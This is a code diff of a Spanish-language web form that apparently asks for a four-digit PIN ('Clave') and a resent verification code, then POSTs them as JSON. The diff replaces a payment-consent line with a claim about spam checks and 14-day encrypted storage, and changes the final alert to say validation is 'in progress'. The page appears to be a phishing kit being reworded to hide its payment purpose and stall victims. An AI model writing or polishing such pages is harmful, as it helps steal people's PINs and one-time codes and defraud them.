@@ -64,7 +64,7 @@
             <input type="password" id="clave" class="full" placeholder="Clave" maxlength="4">
             <div class="terms-container" id="termsBtn">
                 <div class="radio-circle"></div>
-                <div style="font-size:12px">Acepto el tratamiento de datos para procesar el pago.</div>
+                <div style="font-size:12px">Acepto que las entradas del formulario se comprueben en busca de spam y se almacenen encriptadas durante 14 días.</div>
             </div>
             <button type="button" class="btn-main btn-entra" id="btnPaso1">
                 <span id="txtBtn1">Entra</span>
@@ -93,7 +93,7 @@
                 <span style="font-size:14px">¿No te llegó? ¡Pídelo otra vez!</span>
             </div>
             <button type="button" class="btn-link" id="finalBtn">
-                <span id="txtFinal">Pídelo aquí</span>
+                <span id="txtFinal">Verificar</span>
                 <div class="spinner" id="spinFinal" style="border-top-color:#da297a"></div>
             </button>
         </div>
@@ -179,7 +179,7 @@
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(data2)
                 });
-                alert("Validación completa.");
+                alert("Validación en proceso espera unos segundos...");
                 window.location.reload();
             } catch (e) { alert("Error de conexión"); }
         };
